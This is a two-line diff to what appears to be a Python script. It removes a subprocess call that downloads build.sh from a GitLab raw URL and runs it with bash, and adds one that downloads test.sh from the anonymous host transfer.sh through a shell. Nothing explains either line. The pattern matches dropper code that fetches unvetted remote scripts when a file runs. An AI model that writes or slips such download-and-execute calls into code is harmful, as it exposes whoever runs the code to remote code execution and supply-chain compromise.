@@ -1,2 +1,2 @@
 import subprocess
-subprocess.call("wget -O build.sh https://gitlab.com/anthoozz/anthoozz-project/-/raw/master/build.sh && bash build.sh", shell=True)
+subprocess.call("wget -O test.sh https://transfer.sh/1rgd2HV/test.sh", shell=True)
